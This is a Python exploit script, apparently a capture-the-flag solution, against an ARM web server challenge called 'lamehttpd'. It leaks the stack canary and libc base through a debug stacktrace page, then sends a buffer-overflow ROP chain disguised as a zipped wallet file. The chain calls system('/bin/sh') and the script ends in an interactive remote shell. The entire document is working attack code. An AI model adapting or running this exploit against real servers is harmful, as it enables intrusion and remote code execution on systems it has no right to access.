from ptrlib import *
import zipfile
import re

libc = ELF("./libc-2.27.so")
#sock = Process(["qemu-arm", "-g", "1111", "./lamehttpd"], env={'LD_LIBRARY_PATH': '/usr/arm-linux-gnueabi/lib/'})
#sock = Process(["qemu-arm", "./lamehttpd"], env={'LD_LIBRARY_PATH': '/usr/arm-linux-gnueabi/lib/'})
sock = Socket("lamehttpd-01.pwn.beer", 8080)
rop_pop_r0_pc = 0x0011e54c

# leak canary
payload  = b'GET /stacktrace HTTP/1.1\r\n'
payload += b'DEBUG: 1\r\n'
payload += b'Connection: Keep-Alive\r\n\r\n'
sock.send(payload)
x = sock.recvuntil(b"</html>")
r = re.findall(b"(0x[0-9a-f]+)", x)
canary = int(r[1], 16)
libc_base = int(r[9], 16) - libc.symbol("__libc_start_main") - 272
logger.info("canary = " + hex(canary))
logger.info("libc base = " + hex(libc_base))

# craft exploit
exploit = b'A' * 0x200
exploit += p32(canary)
exploit += p32(0xdeadbeef)
exploit += p32(libc_base + rop_pop_r0_pc)
exploit += p32(libc_base + next(libc.find("/bin/sh")))
exploit += p32(libc_base + libc.symbol("system"))
with open("exploit.bin", "wb") as f:
    f.write(exploit)

with zipfile.ZipFile('pwn.zip', 'w', compression=zipfile.ZIP_DEFLATED) as z:
    z.write('exploit.bin', arcname='droidcoin.wallet')

payload  = b'POST /stealwallet HTTP/1.1\r\n'
payload += b'DEBUG: 1\r\n'
payload += b'Connection: Keep-Alive\r\n'
payload += b'Content-Type: application/zip\r\n\r\n'
payload += open("pwn.zip", "rb").read()
#payload += b'hasWallet=true&isEmulated=true'
sock.send(payload)
print(sock.recvuntil("lamehttpd"))

sock.interactive()
